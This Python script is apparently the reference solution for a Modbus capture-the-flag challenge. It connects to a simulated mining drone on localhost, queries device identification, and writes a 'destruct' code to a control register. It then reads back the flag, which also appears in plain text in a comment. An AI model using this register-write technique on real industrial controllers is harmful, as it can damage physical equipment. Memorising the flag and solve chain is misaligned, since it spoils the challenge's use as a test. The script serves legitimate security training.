#!/usr/bin/env python3
"""
Reference solve — These Things Still Run On Modbus
====================================================
Demonstrates the full intended solve chain manually:

  Step 1  FC43 device identification  → vendor URL
  Step 2  Read telemetry registers    → confirm target
  Step 3  Write destruct code         → 0x4444 → reg 1337, unit 0x0A
  Step 4  Read flag registers         → 2000–2017

Dependencies:
    pip install pymodbus==3.7.0
"""

import sys
from pymodbus.client import ModbusTcpClient

# Output uses box-drawing / unit-symbol characters; make sure they render
# on consoles that default to a non-UTF-8 codepage (e.g. Windows cp1252).
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except (AttributeError, ValueError):
    pass

DRONE_HOST      = "127.0.0.1"
DRONE_PORT      = 502
UNIT_ID         = 0x0A
DESTRUCT_REG    = 1337
DESTRUCT_CODE   = 0x4444
FLAG_REG_START  = 2000
FLAG_REG_COUNT  = 18          # len("flag{d3t0n4t3_dm7}")

# FC43/MEI-0x0E "regular" category — the "basic" category (0x01) omits
# VendorUrl, which is the whole point of this step. Read code 0x02 is
# required to actually see it.
DEVICE_INFO_READ_CODE = 0x02


STATUS_LABELS = {
    0: "IDLE",
    1: "TRANSIT",
    2: "DRILL",
    3: "MINING",
    4: "RTB",
}


def banner(msg: str) -> None:
    print(f"\n{'─' * 60}")
    print(f"  {msg}")
    print('─' * 60)


def main() -> None:
    client = ModbusTcpClient(host=DRONE_HOST, port=DRONE_PORT)
    if not client.connect():
        print(f"  [-] Cannot connect to {DRONE_HOST}:{DRONE_PORT}")
        sys.exit(1)
    print(f"  [+] Connected to {DRONE_HOST}:{DRONE_PORT}")

    banner("Step 1 — FC43 Device Identification")
    idr = client.read_device_information(
        read_code=DEVICE_INFO_READ_CODE, object_id=0x00, slave=UNIT_ID
    )
    if idr.isError():
        print(f"  [-] FC43 read failed: {idr}")
        sys.exit(1)

    info = {k: v.decode() for k, v in idr.information.items()}
    vendor_name = info.get(0, "?")
    product_code = info.get(1, "?")
    vendor_url = info.get(3, "?")
    print(f"  VendorName   : {vendor_name}")
    print(f"  ProductCode  : {product_code}")
    print(f"  VendorUrl    : {vendor_url}")
    print(
        f"\n  → Browse {vendor_url}, go to Support, search '{product_code}',\n"
        "    download the PDF manual, read Section 9."
    )

    banner("Step 2 — Read Telemetry")
    rr = client.read_holding_registers(address=0, count=6, slave=UNIT_ID)
    if rr.isError():
        print(f"  [-] FC03 read failed: {rr}")
        sys.exit(1)

    regs = rr.registers
    print(f"  ore_density        : {regs[0]} kg/m³")
    print(f"  thruster_temp      : {regs[1]} °C")
    print(f"  battery_percent    : {regs[2]} %")
    print(f"  operational_status : {regs[3]} ({STATUS_LABELS.get(regs[3], '?')})")
    print(f"  sector_id          : 0x{regs[4]:04X}")
    print(f"  fault_flags        : 0x{regs[5]:04X}")

    banner("Step 3 — Write Destruct Code")
    print(f"  Writing 0x{DESTRUCT_CODE:04X} → register {DESTRUCT_REG}  (unit 0x{UNIT_ID:02X})")
    wr = client.write_register(address=DESTRUCT_REG, value=DESTRUCT_CODE, slave=UNIT_ID)
    if wr.isError():
        print(f"  [-] Write failed: {wr}")
        sys.exit(1)
    print("  [+] Write accepted — destruct sequence authorised")

    banner("Step 4 — Read Flag Registers")
    print(f"  Reading registers {FLAG_REG_START}–{FLAG_REG_START + FLAG_REG_COUNT - 1}  (unit 0x{UNIT_ID:02X})")
    rr = client.read_holding_registers(
        address=FLAG_REG_START, count=FLAG_REG_COUNT, slave=UNIT_ID
    )
    if rr.isError():
        print(f"  [-] FC03 read failed: {rr}")
        sys.exit(1)

    flag = "".join(chr(r) for r in rr.registers if r != 0)
    print(f"\n  FLAG → {flag}\n")

    client.close()


if __name__ == "__main__":
    main()
